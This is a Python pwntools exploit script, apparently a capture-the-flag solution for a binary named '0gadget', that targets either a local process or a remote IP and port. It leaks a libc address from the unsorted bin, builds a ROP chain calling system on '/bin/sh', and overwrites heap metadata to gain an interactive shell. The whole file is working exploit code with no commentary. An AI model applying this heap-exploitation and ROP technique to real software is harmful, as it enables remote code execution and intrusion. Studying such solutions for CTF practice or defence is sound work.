#!/usr/bin/env python
# coding: utf-8

from pwn import *

local = True

if local:
	#context.terminal = ['mate-terminal', '--maximize', '-x', 'sh', '-c']
	context.terminal = ['tmux', 'splitw', '-h']
	#context.terminal = ['tmux', 'splitw', '-v']
	context.log_level = 'debug'
	p = process('./0gadget')
	gdb.attach(p,"""
	b *0x401094
	b *0x400CCB
	b *0x400EDC
	c
	""")
else:
	p = remote('106.75.63.193', 9705)


# aggressive alias
r = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
se = lambda x: p.send(x)
sel = lambda x: p.sendline(x)
pick32 = lambda x: u32(x[:4].ljust(4, '\0'))
pick64 = lambda x: u64(x[:8].ljust(8, '\0'))

# module structure & function
libc_local64 = {
	'base': 0x0,
	'__libc_start_main': 0x20740,
	'system': 0x45390,
	'unsorted_bin': 0x3c3b78,
	'free_hook': 0x3c57a8,
	'realloc_hook': 0x3c3b08,
}

libc_remote = {
	'base': 0x0,
	'__libc_start_main': 0x20740,
	'system': 0x45390,
	'unsorted_bin': 0x3c4b78,
	'realloc_hook': 0x3c4b08,
}

if local:
	libc = libc_local64
else:
	libc = libc_remote
def set_base(mod, ref, addr):
	base = addr - mod[ref]
	for element in mod:
		mod[element] += base
def add(sz, title, cont, remark='Lotus337'):
	ru('choice: ')
	sel('1')
	ru('size: ')
	sel(str(sz))
	ru('title: ')
	se(title)
	ru('content: ')
	se(cont)
	ru('REMARK: ')
	se(remark)
def delete(idx, remark='Lotus337'):
	ru('choice: ')
	sel('2')
	ru('delete: ')
	sel(str(idx))
	ru('REMARK: ')
	se(remark)

add(0xE8, '/bin/sh\n', 'AAAA')
add(0x98, 'BBBB\n', 'BBBB')
add(0x98, 'C' * 144 + '\n', 'CCCC')
raw_input()
delete(1)
ru('choice: ')
sel('3')
ru('show: ')
sel('2')
ru('content: ')
unsorted_bin = pick64(r(8))
set_base(libc, 'unsorted_bin', unsorted_bin)
print('[+] unsorted bin @ %#x' % unsorted_bin)
print('[+] libc base @ %#x' % libc['base'])

rdi_ret = 0x401193
pop4_ret = 0x40118C
ret = 0x401194
ru('REMARK: ')
payload = p64(ret) * 0x10 + p64(rdi_ret) + p64(0x6020E8) + p64(libc['system'])
se(payload)

add(0x98, 'DDDD\n', 'DDDD')
add(0x28, 'EEEE\n', 'EEEE')


add(0x38, 'FFFF\n', 'FFFF')
add(0x38, 'G' * 144 + '\x70', 'GGGG')
add(0x38, 'HHHH\n', 'HHHH')

delete(4)
delete(6)
delete(5)

add(0x38, 'IIII\n', p64(0x602040 + 2 - 8))
add(0x38, 'JJJJ\n', 'JJJJ')
add(0x38, 'KKKK\n', 'KKKK')
add(0x38, 'LLLL\n', 'LLLLLL' + p64(0) + p64(pop4_ret))

p.interactive()
